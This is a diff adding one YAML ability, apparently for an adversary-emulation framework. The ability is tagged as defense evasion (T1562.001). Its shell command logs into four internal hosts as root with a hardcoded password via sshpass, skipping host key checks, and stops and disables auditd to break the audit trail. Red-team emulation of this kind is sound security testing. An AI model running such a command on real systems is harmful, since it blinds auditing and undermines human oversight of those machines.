@@ -1,0 +1,15 @@
+- id: de02-disable-auditd
+  name: Disable Auditd Service
+  description: Stop and disable auditd to break the audit trail
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.001
+    name: Impair Defenses - Disable or Modify Tools
+  platforms:
+    linux:
+      sh:
+        command: |
+          for h in 10.0.20.10 10.0.20.21 10.0.20.30 10.0.20.40; do sshpass -p 'toor' ssh -o StrictHostKeyChecking=no root@$h "systemctl stop auditd 2>/dev/null; systemctl disable auditd 2>/dev/null; echo '[+] auditd disabled on $(hostname)'" 2>/dev/null & done; wait
+
+  singleton: false
+  repeatable: false
